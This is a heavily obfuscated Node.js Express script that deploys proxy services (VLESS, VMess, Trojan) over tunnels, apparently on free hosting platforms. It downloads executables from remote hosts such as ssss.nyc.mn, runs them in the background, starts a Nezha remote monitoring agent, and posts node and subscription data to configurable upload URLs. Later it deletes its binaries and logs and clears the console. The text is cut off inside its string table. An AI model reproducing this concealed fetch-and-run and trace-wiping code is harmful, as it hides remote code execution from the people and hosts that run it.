const _0x57a1fe = _0x26b2
;(function (_0x5e6d20, _0x5131b3) {
  const _0xf39e2a = _0x26b2,
    _0x525be6 = _0x5e6d20()
  while (!![]) {
    try {
      const _0x460bff =
        (-parseInt(_0xf39e2a(0x1c6)) / 0x1) * (parseInt(_0xf39e2a(0x20c)) / 0x2) +
        -parseInt(_0xf39e2a(0x1b8)) / 0x3 +
        (-parseInt(_0xf39e2a(0x1e5)) / 0x4) * (-parseInt(_0xf39e2a(0x1bc)) / 0x5) +
        parseInt(_0xf39e2a(0x18f)) / 0x6 +
        -parseInt(_0xf39e2a(0x1ba)) / 0x7 +
        -parseInt(_0xf39e2a(0x19a)) / 0x8 +
        parseInt(_0xf39e2a(0x1a0)) / 0x9
      if (_0x460bff === _0x5131b3) break
      else _0x525be6['push'](_0x525be6['shift']())
    } catch (_0x1dbe1b) {
      _0x525be6['push'](_0x525be6['shift']())
    }
  }
})(_0x13ff, 0x7526f)
const express = require('express'),
  app = express(),
  axios = require(_0x57a1fe(0x1f0)),
  os = require('os'),
  fs = require('fs'),
  path = require(_0x57a1fe(0x223)),
  { promisify } = require(_0x57a1fe(0x207)),
  exec = promisify(require('child_process')['exec']),
  UPLOAD_URL = process[_0x57a1fe(0x228)][_0x57a1fe(0x242)] || '',
  PROJECT_URL = process[_0x57a1fe(0x228)][_0x57a1fe(0x1cb)] || '',
  AUTO_ACCESS = process['env'][_0x57a1fe(0x1e0)] || ![],
  FILE_PATH = process[_0x57a1fe(0x228)]['FILE_PATH'] || '.tmp',
  NEZHA_SERVER = process[_0x57a1fe(0x228)][_0x57a1fe(0x210)] || '',
  NEZHA_PORT = process[_0x57a1fe(0x228)]['NEZHA_PORT'] || '',
  NEZHA_KEY = process[_0x57a1fe(0x228)][_0x57a1fe(0x240)] || '',
  UUID = process['env'][_0x57a1fe(0x1a2)] || _0x57a1fe(0x209),
  ARGO_AUTH = process[_0x57a1fe(0x228)]['ARGO_AUTH'] || _0x57a1fe(0x239),
  ARGO_DOMAIN = process[_0x57a1fe(0x228)]['ARGO_DOMAIN'] || 'galaxycloud.933993.xyz',
  ARGO_PORT = process['env']['ARGO_PORT'] || 0xe2e1,
  SUB_PATH = process[_0x57a1fe(0x228)][_0x57a1fe(0x1a4)] || _0x57a1fe(0x1ff),
  PORT = process[_0x57a1fe(0x228)][_0x57a1fe(0x1c4)] || process[_0x57a1fe(0x228)][_0x57a1fe(0x238)] || 0xbb8,
  NAME = process[_0x57a1fe(0x228)][_0x57a1fe(0x191)] || _0x57a1fe(0x188),
  CFIP = process[_0x57a1fe(0x228)][_0x57a1fe(0x193)] || _0x57a1fe(0x23d),
  CFPORT = process[_0x57a1fe(0x228)][_0x57a1fe(0x244)] || 0x1bb
!fs['existsSync'](FILE_PATH)
  ? (fs[_0x57a1fe(0x225)](FILE_PATH), console[_0x57a1fe(0x201)](FILE_PATH + _0x57a1fe(0x1c0)))
  : console[_0x57a1fe(0x201)](FILE_PATH + _0x57a1fe(0x203))
function generateRandomName() {
  const _0x4504ba = _0x57a1fe,
    _0x1934a4 = _0x4504ba(0x1a9)
  let _0xa9ae34 = ''
  for (let _0x28ed18 = 0x0; _0x28ed18 < 0x6; _0x28ed18++) {
    _0xa9ae34 += _0x1934a4['charAt'](Math[_0x4504ba(0x1fd)](Math[_0x4504ba(0x1e8)]() * _0x1934a4[_0x4504ba(0x227)]))
  }
  return _0xa9ae34
}
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path[_0x57a1fe(0x231)](FILE_PATH, npmName),
  phpPath = path[_0x57a1fe(0x231)](FILE_PATH, phpName),
  webPath = path[_0x57a1fe(0x231)](FILE_PATH, webName),
  botPath = path[_0x57a1fe(0x231)](FILE_PATH, botName),
  subPath = path[_0x57a1fe(0x231)](FILE_PATH, _0x57a1fe(0x1e3)),
  listPath = path['join'](FILE_PATH, _0x57a1fe(0x1fb)),
  bootLogPath = path[_0x57a1fe(0x231)](FILE_PATH, 'boot.log'),
  configPath = path[_0x57a1fe(0x231)](FILE_PATH, 'config.json')
function deleteNodes() {
  const _0x264f88 = _0x57a1fe
  try {
    if (!UPLOAD_URL) return
    if (!fs[_0x264f88(0x189)](subPath)) return
    let _0x526cf0
    try {
      _0x526cf0 = fs[_0x264f88(0x200)](subPath, _0x264f88(0x21c))
    } catch {
      return null
    }
    const _0x51ba15 = Buffer['from'](_0x526cf0, _0x264f88(0x192))[_0x264f88(0x215)]('utf-8'),
      _0x47151b = _0x51ba15['split']('\x0a')['filter']((_0x2d7a23) => /(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2d7a23))
    if (_0x47151b[_0x264f88(0x227)] === 0x0) return
    return (
      axios['post'](UPLOAD_URL + _0x264f88(0x206), JSON['stringify']({ nodes: _0x47151b }), { headers: { 'Content-Type': _0x264f88(0x19c) } })[
        _0x264f88(0x23b)
      ]((_0x310b60) => {
        return null
      }),
      null
    )
  } catch (_0x7f9241) {
    return null
  }
}
function cleanupOldFiles() {
  const _0x21b739 = _0x57a1fe
  try {
    const _0x2740bd = fs[_0x21b739(0x1f1)](FILE_PATH)
    _0x2740bd['forEach']((_0x25c157) => {
      const _0x179558 = _0x21b739,
        _0x1e2c68 = path[_0x179558(0x231)](FILE_PATH, _0x25c157)
      try {
        const _0x5add8f = fs[_0x179558(0x1c3)](_0x1e2c68)
        _0x5add8f[_0x179558(0x198)]() && fs[_0x179558(0x1a7)](_0x1e2c68)
      } catch (_0x4cba4c) {}
    })
  } catch (_0x4f1aa5) {}
}
async function generateConfig() {
  const _0x54806e = _0x57a1fe,
    _0x4d8942 = {
      log: { access: _0x54806e(0x22c), error: _0x54806e(0x22c), loglevel: _0x54806e(0x1b9) },
      inbounds: [
        {
          port: ARGO_PORT,
          protocol: _0x54806e(0x204),
          settings: {
            clients: [{ id: UUID, flow: _0x54806e(0x1c9) }],
            decryption: _0x54806e(0x1b9),
            fallbacks: [
              { dest: 0xbb9 },
              { path: _0x54806e(0x1f5), dest: 0xbba },
              { path: '/vmess-argo', dest: 0xbbb },
              { path: _0x54806e(0x187), dest: 0xbbc }
            ]
          },
          streamSettings: { network: _0x54806e(0x218) }
        },
        {
          port: 0xbb9,
          listen: _0x54806e(0x232),
          protocol: _0x54806e(0x204),
          settings: { clients: [{ id: UUID }], decryption: 'none' },
          streamSettings: { network: _0x54806e(0x218), security: _0x54806e(0x1b9) }
        },
        {
          port: 0xbba,
          listen: '127.0.0.1',
          protocol: _0x54806e(0x204),
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x54806e(0x1b9) },
          streamSettings: { network: 'ws', security: _0x54806e(0x1b9), wsSettings: { path: '/vless-argo' } },
          sniffing: { enabled: !![], destOverride: [_0x54806e(0x205), _0x54806e(0x1da), 'quic'], metadataOnly: ![] }
        },
        {
          port: 0xbbb,
          listen: _0x54806e(0x232),
          protocol: 'vmess',
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x54806e(0x194) } },
          sniffing: { enabled: !![], destOverride: [_0x54806e(0x205), _0x54806e(0x1da), _0x54806e(0x1c1)], metadataOnly: ![] }
        },
        {
          port: 0xbbc,
          listen: _0x54806e(0x232),
          protocol: _0x54806e(0x20f),
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: _0x54806e(0x1b9), wsSettings: { path: '/trojan-argo' } },
          sniffing: { enabled: !![], destOverride: ['http', _0x54806e(0x1da), _0x54806e(0x1c1)], metadataOnly: ![] }
        }
      ],
      dns: { servers: [_0x54806e(0x22e)] },
      outbounds: [
        { protocol: _0x54806e(0x1ee), tag: _0x54806e(0x1f6) },
        { protocol: _0x54806e(0x21e), tag: _0x54806e(0x23f) }
      ]
    }
  fs[_0x54806e(0x217)](path[_0x54806e(0x231)](FILE_PATH, 'config.json'), JSON['stringify'](_0x4d8942, null, 0x2))
}
function getSystemArchitecture() {
  const _0x4adf6d = _0x57a1fe,
    _0x324bb7 = os[_0x4adf6d(0x1bb)]()
  return _0x324bb7 === _0x4adf6d(0x246) || _0x324bb7 === 'arm64' || _0x324bb7 === _0x4adf6d(0x1eb) ? _0x4adf6d(0x246) : 'amd'
}
function downloadFile(_0x3650af, _0x4d30f4, _0x28fb25) {
  const _0x2070fd = _0x57a1fe,
    _0x2cbdf1 = _0x3650af
  !fs[_0x2070fd(0x189)](FILE_PATH) && fs[_0x2070fd(0x225)](FILE_PATH, { recursive: !![] })
  const _0x24120d = fs[_0x2070fd(0x1cf)](_0x2cbdf1)
  axios({ method: _0x2070fd(0x233), url: _0x4d30f4, responseType: _0x2070fd(0x1a8) })
    ['then']((_0x43b70c) => {
      const _0x5ac5f6 = _0x2070fd
      ;(_0x43b70c[_0x5ac5f6(0x1b2)][_0x5ac5f6(0x1b7)](_0x24120d),
        _0x24120d['on'](_0x5ac5f6(0x1c7), () => {
          const _0x1c5b8d = _0x5ac5f6
          ;(_0x24120d['close'](),
            console[_0x1c5b8d(0x201)](_0x1c5b8d(0x18d) + path[_0x1c5b8d(0x1f3)](_0x2cbdf1) + _0x1c5b8d(0x186)),
            _0x28fb25(null, _0x2cbdf1))
        }),
        _0x24120d['on'](_0x5ac5f6(0x1e4), (_0x721bd3) => {
          const _0x11f50b = _0x5ac5f6
          fs['unlink'](_0x2cbdf1, () => {})
          const _0x16af30 = _0x11f50b(0x18d) + path[_0x11f50b(0x1f3)](_0x2cbdf1) + '\x20failed:\x20' + _0x721bd3[_0x11f50b(0x23c)]
          ;(console[_0x11f50b(0x1e4)](_0x16af30), _0x28fb25(_0x16af30))
        }))
    })
    [_0x2070fd(0x23b)]((_0x3930d5) => {
      const _0x4a549f = _0x2070fd,
        _0x324c57 = _0x4a549f(0x18d) + path['basename'](_0x2cbdf1) + _0x4a549f(0x216) + _0x3930d5[_0x4a549f(0x23c)]
      ;(console['error'](_0x324c57), _0x28fb25(_0x324c57))
    })
}
function _0x26b2(_0x108f35, _0x23f16e) {
  const _0x13ff02 = _0x13ff()
  return (
    (_0x26b2 = function (_0x26b213, _0x106db3) {
      _0x26b213 = _0x26b213 - 0x186
      let _0x123a00 = _0x13ff02[_0x26b213]
      return _0x123a00
    }),
    _0x26b2(_0x108f35, _0x23f16e)
  )
}
async function downloadFilesAndRun() {
  const _0x545020 = _0x57a1fe,
    _0x54d252 = getSystemArchitecture(),
    _0x1664bc = getFilesForArchitecture(_0x54d252)
  if (_0x1664bc['length'] === 0x0) {
    console[_0x545020(0x201)](_0x545020(0x234))
    return
  }
  const _0xffe6c9 = _0x1664bc[_0x545020(0x1e6)]((_0x3fc556) => {
    return new Promise((_0x4fb9b4, _0x3f7b77) => {
      const _0x4b1d35 = _0x26b2
      downloadFile(_0x3fc556[_0x4b1d35(0x19b)], _0x3fc556[_0x4b1d35(0x1a1)], (_0x59225b, _0x392ea5) => {
        _0x59225b ? _0x3f7b77(_0x59225b) : _0x4fb9b4(_0x392ea5)
      })
    })
  })
  try {
    await Promise[_0x545020(0x219)](_0xffe6c9)
  } catch (_0x40c415) {
    console[_0x545020(0x1e4)]('Error\x20downloading\x20files:', _0x40c415)
    return
  }
  function _0x1a5119(_0x20eb5b) {
    const _0x474dcb = _0x545020,
      _0x1e9a86 = 0x1fd
    _0x20eb5b[_0x474dcb(0x1c8)]((_0x257c52) => {
      fs['existsSync'](_0x257c52) &&
        fs['chmod'](_0x257c52, _0x1e9a86, (_0x2ac9b8) => {
          const _0x48f20 = _0x26b2
          _0x2ac9b8
            ? console[_0x48f20(0x1e4)](_0x48f20(0x1dd) + _0x257c52 + ':\x20' + _0x2ac9b8)
            : console[_0x48f20(0x201)](_0x48f20(0x1de) + _0x257c52 + ':\x20' + _0x1e9a86[_0x48f20(0x215)](0x8))
        })
    })
  }
  const _0x19836f = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x1a5119(_0x19836f)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0xee355a = NEZHA_SERVER[_0x545020(0x1fa)](':') ? NEZHA_SERVER['split'](':')['pop']() : '',
        _0x1d802f = new Set([_0x545020(0x213), _0x545020(0x1d1), _0x545020(0x1b0), _0x545020(0x1e1), '2083', '2053']),
        _0x358ac7 = _0x1d802f[_0x545020(0x1d2)](_0xee355a) ? 'true' : 'false',
        _0x448b4a = _0x545020(0x222) + NEZHA_KEY + _0x545020(0x226) + NEZHA_SERVER + _0x545020(0x1d3) + _0x358ac7 + _0x545020(0x21d) + UUID
      fs['writeFileSync'](path[_0x545020(0x231)](FILE_PATH, _0x545020(0x19d)), _0x448b4a)
      const _0x5f498d = _0x545020(0x196) + phpPath + _0x545020(0x1ac) + FILE_PATH + _0x545020(0x212)
      try {
        ;(await exec(_0x5f498d),
          console[_0x545020(0x201)](phpName + _0x545020(0x1b3)),
          await new Promise((_0x343b66) => setTimeout(_0x343b66, 0x3e8)))
      } catch (_0x2defbe) {
        console[_0x545020(0x1e4)](_0x545020(0x199) + _0x2defbe)
      }
    } else {
      let _0x5c4126 = ''
      const _0x3f9ec1 = [_0x545020(0x213), _0x545020(0x1d1), _0x545020(0x1b0), _0x545020(0x1e1), _0x545020(0x197), _0x545020(0x221)]
      _0x3f9ec1[_0x545020(0x1fa)](NEZHA_PORT) && (_0x5c4126 = _0x545020(0x18b))
      const _0x12615d =
        _0x545020(0x196) +
        npmPath +
        '\x20-s\x20' +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        _0x545020(0x1ae) +
        NEZHA_KEY +
        '\x20' +
        _0x5c4126 +
        _0x545020(0x1be)
      try {
        ;(await exec(_0x12615d), console['log'](npmName + _0x545020(0x1b3)), await new Promise((_0x1b40ae) => setTimeout(_0x1b40ae, 0x3e8)))
      } catch (_0x3570c3) {
        console['error'](_0x545020(0x1a6) + _0x3570c3)
      }
    }
  } else console[_0x545020(0x201)]('NEZHA\x20variable\x20is\x20empty,skip\x20running')
  const _0x8b162c = _0x545020(0x196) + webPath + '\x20-c\x20' + FILE_PATH + _0x545020(0x1d4)
  try {
    ;(await exec(_0x8b162c), console['log'](webName + _0x545020(0x1b3)), await new Promise((_0x1d9648) => setTimeout(_0x1d9648, 0x3e8)))
  } catch (_0x2402ec) {
    console[_0x545020(0x1e4)](_0x545020(0x22b) + _0x2402ec)
  }
  if (fs['existsSync'](botPath)) {
    let _0x317076
    if (ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/)) _0x317076 = _0x545020(0x1ad) + ARGO_AUTH
    else
      ARGO_AUTH[_0x545020(0x1af)](/TunnelSecret/)
        ? (_0x317076 = 'tunnel\x20--edge-ip-version\x20auto\x20--config\x20' + FILE_PATH + _0x545020(0x19e))
        : (_0x317076 =
            'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20' +
            FILE_PATH +
            _0x545020(0x236) +
            ARGO_PORT)
    try {
      ;(await exec(_0x545020(0x196) + botPath + '\x20' + _0x317076 + _0x545020(0x20d)),
        console[_0x545020(0x201)](botName + _0x545020(0x1b3)),
        await new Promise((_0x55cb59) => setTimeout(_0x55cb59, 0x7d0)))
    } catch (_0x1d3908) {
      console['error'](_0x545020(0x1a5) + _0x1d3908)
    }
  }
  await new Promise((_0xfd6664) => setTimeout(_0xfd6664, 0x1388))
}
function getFilesForArchitecture(_0x526c08) {
  const _0x495cea = _0x57a1fe
  let _0x256302
  _0x526c08 === 'arm'
    ? (_0x256302 = [
        { fileName: webPath, fileUrl: _0x495cea(0x1b5) },
        { fileName: botPath, fileUrl: _0x495cea(0x1a3) }
      ])
    : (_0x256302 = [
        { fileName: webPath, fileUrl: _0x495cea(0x1aa) },
        { fileName: botPath, fileUrl: 'https://amd64.ssss.nyc.mn/bot' }
      ])
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) {
      const _0x1b5977 = _0x526c08 === _0x495cea(0x246) ? _0x495cea(0x1ab) : _0x495cea(0x18a)
      _0x256302['unshift']({ fileName: npmPath, fileUrl: _0x1b5977 })
    } else {
      const _0x57e407 = _0x526c08 === _0x495cea(0x246) ? _0x495cea(0x1f9) : _0x495cea(0x1f4)
      _0x256302['unshift']({ fileName: phpPath, fileUrl: _0x57e407 })
    }
  }
  return _0x256302
}
function argoType() {
  const _0x381f14 = _0x57a1fe
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console[_0x381f14(0x201)](_0x381f14(0x1ca))
    return
  }
  if (ARGO_AUTH[_0x381f14(0x1fa)]('TunnelSecret')) {
    fs[_0x381f14(0x217)](path[_0x381f14(0x231)](FILE_PATH, 'tunnel.json'), ARGO_AUTH)
    const _0x73d94 =
      _0x381f14(0x18c) +
      ARGO_AUTH[_0x381f14(0x1d7)]('\x22')[0xb] +
      '\x0a\x20\x20credentials-file:\x20' +
      path[_0x381f14(0x231)](FILE_PATH, _0x381f14(0x1c2)) +
      _0x381f14(0x1ed) +
      ARGO_DOMAIN +
      _0x381f14(0x1bf) +
      ARGO_PORT +
      _0x381f14(0x229)
    fs[_0x381f14(0x217)](path[_0x381f14(0x231)](FILE_PATH, _0x381f14(0x23e)), _0x73d94)
  } else console[_0x381f14(0x201)](_0x381f14(0x241))
}
async function extractDomains() {
  const _0x5853de = _0x57a1fe
  let _0x393e39
  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x393e39 = ARGO_DOMAIN), console[_0x5853de(0x201)](_0x5853de(0x22f), _0x393e39), await _0x6d99ed(_0x393e39))
  else
    try {
      const _0x5b80e6 = fs[_0x5853de(0x200)](path[_0x5853de(0x231)](FILE_PATH, _0x5853de(0x21a)), _0x5853de(0x21c)),
        _0x39e05e = _0x5b80e6[_0x5853de(0x1d7)]('\x0a'),
        _0x1af0ff = []
      _0x39e05e['forEach']((_0x5aabd6) => {
        const _0x1c3cc8 = _0x5853de,
          _0xb3637b = _0x5aabd6['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0xb3637b) {
          const _0x5a142a = _0xb3637b[0x1]
          _0x1af0ff[_0x1c3cc8(0x1ea)](_0x5a142a)
        }
      })
      if (_0x1af0ff['length'] > 0x0)
        ((_0x393e39 = _0x1af0ff[0x0]), console[_0x5853de(0x201)](_0x5853de(0x243), _0x393e39), await _0x6d99ed(_0x393e39))
      else {
        ;(console[_0x5853de(0x201)](_0x5853de(0x1b1)), fs[_0x5853de(0x1a7)](path[_0x5853de(0x231)](FILE_PATH, 'boot.log')))
        async function _0x3afa5e() {
          const _0x4190a6 = _0x5853de
          try {
            process['platform'] === _0x4190a6(0x1db)
              ? await exec(_0x4190a6(0x20b) + botName + _0x4190a6(0x220))
              : await exec(_0x4190a6(0x1cc) + botName[_0x4190a6(0x247)](0x0) + ']' + botName[_0x4190a6(0x1c5)](0x1) + _0x4190a6(0x202))
          } catch (_0x5b7864) {}
        }
        ;(_0x3afa5e(), await new Promise((_0x486fd9) => setTimeout(_0x486fd9, 0xbb8)))
        const _0xc2098c = _0x5853de(0x1b6) + FILE_PATH + _0x5853de(0x236) + ARGO_PORT
        try {
          ;(await exec('nohup\x20' + botPath + '\x20' + _0xc2098c + _0x5853de(0x20d)),
            console[_0x5853de(0x201)](botName + _0x5853de(0x1b3)),
            await new Promise((_0x39a436) => setTimeout(_0x39a436, 0xbb8)),
            await extractDomains())
        } catch (_0x422094) {
          console[_0x5853de(0x1e4)]('Error\x20executing\x20command:\x20' + _0x422094)
        }
      }
    } catch (_0x3d0d7d) {
      console[_0x5853de(0x1e4)](_0x5853de(0x235), _0x3d0d7d)
    }
  async function _0x43a96c() {
    const _0x11cc4e = _0x5853de
    try {
      const _0x2796ff = await axios[_0x11cc4e(0x233)]('https://ipapi.co/json', { timeout: 0xbb8 })
      if (_0x2796ff['data'] && _0x2796ff[_0x11cc4e(0x1b2)][_0x11cc4e(0x1ec)] && _0x2796ff[_0x11cc4e(0x1b2)][_0x11cc4e(0x211)])
        return _0x2796ff[_0x11cc4e(0x1b2)][_0x11cc4e(0x1ec)] + '_' + _0x2796ff['data'][_0x11cc4e(0x211)]
    } catch (_0x5e513c) {
      try {
        const _0x37ccfe = await axios[_0x11cc4e(0x233)](_0x11cc4e(0x1d8), { timeout: 0xbb8 })
        if (
          _0x37ccfe[_0x11cc4e(0x1b2)] &&
          _0x37ccfe['data'][_0x11cc4e(0x230)] === _0x11cc4e(0x1fe) &&
          _0x37ccfe[_0x11cc4e(0x1b2)]['countryCode'] &&
          _0x37ccfe[_0x11cc4e(0x1b2)][_0x11cc4e(0x211)]
        )
          return _0x37ccfe['data']['countryCode'] + '_' + _0x37ccfe[_0x11cc4e(0x1b2)]['org']
      } catch (_0x175c1) {}
    }
    return _0x11cc4e(0x1d0)
  }
  async function _0x6d99ed(_0x34f9e7) {
    const _0x189aac = await _0x43a96c(),
      _0x272974 = NAME ? NAME + '-' + _0x189aac : _0x189aac
    return new Promise((_0x194acc) => {
      setTimeout(() => {
        const _0x52f960 = _0x26b2,
          _0x390297 = {
            v: '2',
            ps: '' + _0x272974,
            add: CFIP,
            port: CFPORT,
            id: UUID,
            aid: '0',
            scy: 'none',
            net: 'ws',
            type: 'none',
            host: _0x34f9e7,
            path: '/vmess-argo?ed=2560',
            tls: _0x52f960(0x1da),
            sni: _0x34f9e7,
            alpn: '',
            fp: 'firefox'
          },
          _0x585603 =
            _0x52f960(0x208) +
            UUID +
            '@' +
            CFIP +
            ':' +
            CFPORT +
            _0x52f960(0x237) +
            _0x34f9e7 +
            _0x52f960(0x1ce) +
            _0x34f9e7 +
            '&path=%2Fvless-argo%3Fed%3D2560#' +
            _0x272974 +
            '\x0a\x0avmess://' +
            Buffer[_0x52f960(0x1df)](JSON[_0x52f960(0x1e2)](_0x390297))[_0x52f960(0x215)]('base64') +
            _0x52f960(0x21f) +
            UUID +
            '@' +
            CFIP +
            ':' +
            CFPORT +
            _0x52f960(0x214) +
            _0x34f9e7 +
            _0x52f960(0x1ce) +
            _0x34f9e7 +
            _0x52f960(0x1f2) +
            _0x272974 +
            _0x52f960(0x190)
        ;(console[_0x52f960(0x201)](Buffer[_0x52f960(0x1df)](_0x585603)[_0x52f960(0x215)]('base64')),
          fs['writeFileSync'](subPath, Buffer[_0x52f960(0x1df)](_0x585603)[_0x52f960(0x215)](_0x52f960(0x192))),
          console[_0x52f960(0x201)](FILE_PATH + '/sub.txt\x20saved\x20successfully'),
          uploadNodes(),
          app[_0x52f960(0x233)]('/' + SUB_PATH, (_0x32472e, _0x2215a1) => {
            const _0x5efdc1 = _0x52f960,
              _0x138786 = Buffer['from'](_0x585603)['toString']('base64')
            ;(_0x2215a1[_0x5efdc1(0x20e)]('Content-Type', _0x5efdc1(0x18e)), _0x2215a1['send'](_0x138786))
          }),
          _0x194acc(_0x585603))
      }, 0x7d0)
    })
  }
}
async function uploadNodes() {
  const _0x401460 = _0x57a1fe
  if (UPLOAD_URL && PROJECT_URL) {
    const _0x53d3bb = PROJECT_URL + '/' + SUB_PATH,
      _0x37accc = { subscription: [_0x53d3bb] }
    try {
      const _0x235461 = await axios[_0x401460(0x1d5)](UPLOAD_URL + _0x401460(0x1e7), _0x37accc, { headers: { 'Content-Type': _0x401460(0x19c) } })
      return _0x235461 && _0x235461[_0x401460(0x230)] === 0xc8 ? (console[_0x401460(0x201)](_0x401460(0x1dc)), _0x235461) : null
    } catch (_0x124823) {
      if (_0x124823[_0x401460(0x23a)]) {
        if (_0x124823['response']['status'] === 0x190) {
        }
      }
    }
  } else {
    if (UPLOAD_URL) {
      if (!fs[_0x401460(0x189)](listPath)) return
      const _0x3d5011 = fs[_0x401460(0x200)](listPath, 'utf-8'),
        _0x1b76d1 = _0x3d5011[_0x401460(0x1d7)]('\x0a')[_0x401460(0x1f7)]((_0x4dac43) =>
          /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x401460(0x1cd)](_0x4dac43)
        )
      if (_0x1b76d1[_0x401460(0x227)] === 0x0) return
      const _0x1e5d1b = JSON[_0x401460(0x1e2)]({ nodes: _0x1b76d1 })
      try {
        const _0xdbc7da = await axios[_0x401460(0x1d5)](UPLOAD_URL + _0x401460(0x20a), _0x1e5d1b, { headers: { 'Content-Type': _0x401460(0x19c) } })
        return _0xdbc7da && _0xdbc7da[_0x401460(0x230)] === 0xc8 ? (console[_0x401460(0x201)]('Nodes\x20uploaded\x20successfully'), _0xdbc7da) : null
      } catch (_0x4bed6b) {
        return null
      }
    } else return
  }
}
function cleanFiles() {
  setTimeout(() => {
    const _0x12e639 = _0x26b2,
      _0x3107a2 = [bootLogPath, configPath, webPath, botPath]
    if (NEZHA_PORT) _0x3107a2[_0x12e639(0x1ea)](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0x3107a2['push'](phpPath)
    process['platform'] === _0x12e639(0x1db)
      ? exec(_0x12e639(0x1d6) + _0x3107a2['join']('\x20') + _0x12e639(0x1b4), (_0x1ff9b1) => {
          const _0x5ec3f2 = _0x12e639
          ;(console[_0x5ec3f2(0x1d9)](), console[_0x5ec3f2(0x201)](_0x5ec3f2(0x1e9)), console[_0x5ec3f2(0x201)](_0x5ec3f2(0x245)))
        })
      : exec(_0x12e639(0x1ef) + _0x3107a2['join']('\x20') + _0x12e639(0x22d), (_0xe2df0c) => {
          const _0x245529 = _0x12e639
          ;(console[_0x245529(0x1d9)](), console[_0x245529(0x201)](_0x245529(0x1e9)), console['log'](_0x245529(0x245)))
        })
  }, 0x15f90)
}
cleanFiles()
async function AddVisitTask() {
  const _0x476303 = _0x57a1fe
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console[_0x476303(0x201)](_0x476303(0x1f8))
    return
  }
  try {
    const _0x4941a8 = await axios['post'](_0x476303(0x19f), { url: PROJECT_URL }, { headers: { 'Content-Type': _0x476303(0x19c) } })
    return (console[_0x476303(0x201)]('automatic\x20access\x20task\x20added\x20successfully'), _0x4941a8)
  } catch (_0x147b17) {
    return (console[_0x476303(0x1e4)](_0x476303(0x22a) + _0x147b17[_0x476303(0x23c)]), null)
  }
}
async function startserver() {
  const _0x4d94ab = _0x57a1fe
  try {
    ;(argoType(), deleteNodes(), cleanupOldFiles(), await generateConfig(), await downloadFilesAndRun(), await extractDomains(), await AddVisitTask())
  } catch (_0x22b75a) {
    console[_0x4d94ab(0x1e4)](_0x4d94ab(0x224), _0x22b75a)
  }
}
function _0x13ff() {
  const _0x58483a = [
    'catch',
    'message',
    'mfa.gov.ua',
    'tunnel.yml',
    'block',
    'NEZHA_KEY',
    'ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel',
    'UPLOAD_URL',
    'ArgoDomain:',
    'CFPORT',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    'arm',
    'charAt',
    '\x20successfully',
    '/trojan-argo',
    'js-node',
    'existsSync',
    'https://amd64.ssss.nyc.mn/agent',
    '--tls',
    '\x0a\x20\x20tunnel:\x20',
    'Download\x20',
    'text/plain;\x20charset=utf-8',
    '1468608EsAyOR',
    '\x0a\x20\x20\x20\x20',
    'NAME',
    'base64',
    'CFIP',
    '/vmess-argo',
    'promises',
    'nohup\x20',
    '2083',
    'isFile',
    'php\x20running\x20error:\x20',
    '7505256LEdikL',
    'fileName',
    'application/json',
    'config.yaml',
    '/tunnel.yml\x20run',
    'https://oooo.serv00.net/add-url',
    '16330023rlmdon',
    'fileUrl',
    'UUID',
    'https://arm64.ssss.nyc.mn/bot',
    'SUB_PATH',
    'Error\x20executing\x20command:\x20',
    'npm\x20running\x20error:\x20',
    'unlinkSync',
    'stream',
    'abcdefghijklmnopqrstuvwxyz',
    'https://amd64.ssss.nyc.mn/web',
    'https://arm64.ssss.nyc.mn/agent',
    '\x20-c\x20\x22',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20',
    '\x20-p\x20',
    'match',
    '2096',
    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
    'data',
    '\x20is\x20running',
    '\x20>\x20nul\x202>&1',
    'https://arm64.ssss.nyc.mn/web',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20',
    'pipe',
    '441798JmBFlC',
    'none',
    '363636IlkTvY',
    'arch',
    '2580BqjpVd',
    'listen',
    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
    '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:',
    '\x20is\x20created',
    'quic',
    'tunnel.json',
    'statSync',
    'SERVER_PORT',
    'substring',
    '49KMJAJI',
    'finish',
    'forEach',
    'xtls-rprx-vision',
    'ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels',
    'PROJECT_URL',
    'pkill\x20-f\x20\x22[',
    'test',
    '&fp=firefox&type=ws&host=',
    'createWriteStream',
    'Unknown',
    '8443',
    'has',
    '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',
    '/config.json\x20>/dev/null\x202>&1\x20&',
    'post',
    'del\x20/f\x20/q\x20',
    'split',
    'http://ip-api.com/json',
    'clear',
    'tls',
    'win32',
    'Subscription\x20uploaded\x20successfully',
    'Empowerment\x20failed\x20for\x20',
    'Empowerment\x20success\x20for\x20',
    'from',
    'AUTO_ACCESS',
    '2087',
    'stringify',
    'sub.txt',
    'error',
    '1348YfvHyo',
    'map',
    '/api/add-subscriptions',
    'random',
    'App\x20is\x20running',
    'push',
    'aarch64',
    'country_code',
